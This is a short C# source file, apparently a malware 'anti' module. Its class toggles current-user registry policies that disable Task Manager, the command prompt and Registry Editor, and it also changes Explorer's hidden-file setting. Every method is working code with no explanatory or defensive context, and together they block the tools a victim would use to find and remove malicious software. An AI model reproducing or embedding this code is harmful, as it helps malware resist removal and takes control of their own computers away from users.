using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

    public class Antis
    {
        public static bool TaskManager()
        {
            try
            {
          RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (objRegistryKey.GetValue("DisableTaskMgr") == null)
                objRegistryKey.SetValue("DisableTaskMgr", "1");
            else
                objRegistryKey.DeleteValue("DisableTaskMgr");
            objRegistryKey.Close();
            return true;
            }
            catch { return false; }
        }
        public static bool CMD()
        {
            try
            {
            RegistryKey objRegKey = Registry.CurrentUser.CreateSubKey(
                 @"Software\Policies\Microsoft\Windows\System");
            if (objRegKey.GetValue("DisableCMD") == null)
                objRegKey.SetValue("DisableCMD", "1");
            else
                objRegKey.DeleteValue("DisableCMD");
            objRegKey.Close();
            return true;
            }
            catch { return false; }
        }
        public static bool Regedit()
        {
            try
            {
            RegistryKey oRegKey = Registry.CurrentUser.CreateSubKey(
     @"Software\Policies\Microsoft\Windows\System");
            if (oRegKey.GetValue("DisableRegistryTools") == null)
                oRegKey.SetValue("DisableRegistryTools", "1");
            else
                oRegKey.DeleteValue("DisableRegistryTools");
            oRegKey.Close();
            return true;
            }
            catch { return false;  }
        }
        public static bool folderOptions()
        {
            try
            {
                RegistryKey fRegKey = Registry.CurrentUser.CreateSubKey(
         @"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced");
                if (fRegKey.GetValue("Hidden") == null)
                    fRegKey.SetValue("Hidden", "1");
                else
                    fRegKey.DeleteValue("Hidden");
                fRegKey.Close();
                return true;
            }
            catch { return false; }
        }
    }
